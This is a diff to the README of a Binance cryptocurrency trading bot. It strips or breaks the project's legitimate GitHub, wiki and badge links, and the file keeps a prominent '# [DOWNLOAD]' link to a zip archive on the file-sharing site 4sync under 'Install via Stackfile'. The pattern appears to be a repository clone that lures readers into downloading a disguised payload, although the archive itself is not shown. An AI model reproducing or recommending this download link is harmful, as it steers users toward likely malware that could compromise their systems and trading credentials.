@@ -4,11 +4,11 @@
 
 
 [![GitHub version](https://img.shields.io/github/package-json/v/chrisleekr/binance-trading-bot)](https://github.com/chrisleekr/binance-trading-bot/releases)
-[![Build](https://github.com/chrisleekr/binance-trading-bot/workflows/Push/badge.svg)](https://github.com/chrisleekr/binance-trading-bot/actions?query=workflow%3APush)
-[![CodeCov](https://codecov.io/gh/chrisleekr/binance-trading-bot/branch/master/graph/badge.svg)](https://codecov.io/gh/chrisleekr/binance-trading-bot)
-[![Docker pull](https://img.shields.io/docker/pulls/chrisleekr/binance-trading-bot)](https://hub.docker.com/r/chrisleekr/binance-trading-bot)
-[![GitHub contributors](https://img.shields.io/github/contributors/chrisleekr/binance-trading-bot)](https://github.com/chrisleekr/binance-trading-bot/graphs/contributors)
-[![MIT License](https://img.shields.io/github/license/chrisleekr/binance-trading-bot)](https://github.com/chrisleekr/binance-trading-bot/blob/master/LICENSE)
+[![Build](]
+[![CodeCov]()]
+[![Docker pull](https://img.shields.io/docker/pulls/chrisleekr/binance-trading-bot)]
+[![GitHub contributors](https://img.shields.io/github/contributors/chrisleekr/binance-trading-bot)]
+[![MIT License](https://img.shields.io/github/license/chrisleekr/binance-trading-bot)]
 
 > Automated Binance trading bot with trailing buy/sell strategy
 
@@ -142,7 +142,6 @@ Then the bot will execute 2nd purchase for the coin. The last buy price will be 
 
 The detailed document for buy configuration available here.
 
-[https://github.com/chrisleekr/binance-trading-bot/wiki/Buy-Scenario](https://github.com/chrisleekr/binance-trading-bot/wiki/Buy-Scenario)
 
 ### Sell Signal
 
@@ -243,9 +242,8 @@ The final profit would be
 
 The detailed document for buy configuration available here.
 
-[https://github.com/chrisleekr/binance-trading-bot/wiki/Sell-Scenario](https://github.com/chrisleekr/binance-trading-bot/wiki/Sell-Scenario)
 
-### [Features](https://github.com/chrisleekr/binance-trading-bot/wiki/Features)
+### [Features]
 
 - Manual trade
 - Convert small balances to BNB
@@ -322,8 +320,7 @@ Or use the frontend to adjust configurations after launching the application.
 3. Open browser `http://0.0.0.0:8080` to see the frontend
 
    - When launching the application, it will notify public URL to the Slack.
-   - If you have any issue with the bot, you can check the log to find out what happened with the bot. Please take a look [Troubleshooting](https://github.com/chrisleekr/binance-trading-bot/wiki/Troubleshooting)
-
+   - If you have any issue with the bot, you can check the log to find out what happened with the bot. Please take a look [Troubleshooting]
 ### Install via Stackfile
 
 # [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
@@ -351,7 +348,7 @@ Or use the frontend to adjust configurations after launching the application.
 
 ## Acknowledgments
 
-- [@d0x2f](https://github.com/d0x2f)
+- [@d0x2f]
 - And many others! Thanks guys!
 
 
